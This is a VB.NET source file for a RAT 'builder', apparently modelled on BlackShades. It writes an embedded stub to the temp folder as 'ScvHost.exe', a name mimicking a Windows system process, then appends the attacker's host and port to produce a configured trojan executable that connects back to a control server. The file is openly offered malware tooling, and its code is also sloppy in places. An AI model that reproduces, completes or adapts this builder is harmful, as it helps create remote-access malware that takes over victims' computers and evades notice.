Imports System.IO

Public Class MiniBuilder
    Dim stub, text1, text2 As String
    Const spl As String = "abccba" ' same in server if you wanna to change it  , we have to change it in server 
    Dim ex As Exception
    Private Sub BlackShadesNetButton1_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton1.Click
        If TextBox1.Text & TextBox2.Text = "" Then
            MsgBox("Please Fill Host , port and Name  settings ") ' we here handel the case of empty host or port to avoid errors while runntin the server send on nothing 

        Else
            Dim s As New SaveFileDialog
            s.ShowDialog()
            If s.FileName > "" Then
                text1 = TextBox1.Text
                text2 = TextBox2.Text
                Dim temp As String = IO.Path.GetTempPath() & "ScvHost.exe"
                File.WriteAllBytes(temp, My.Resources.mini)

                FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                '  FileOpen(1, Application.StartupPath & "\stub.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default) ' weh you build it it will got to the dir which you rat is and search for the file called stub.exe
                stub = Space(LOF(1))
                FileGet(1, stub)
                FileClose(1)
                FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default) ' will try to save it and while saving it will put the options you selected 
                FilePut(1, stub & spl & text1 & spl & text2)
                ' will send and write in server check state so we will handel or check boxes

                ' Make sure !!!!!!!!!!! every entry  is splitted by spl to avoid mixing 
                ' after putting will close 
                FileClose()
                MsgBox("Done !! " & Environment.NewLine & "File Saved in " & Environment.NewLine & s.FileName)

            Else
                MsgBox(ex.Message)

            End If
        End If
    End Sub
End Class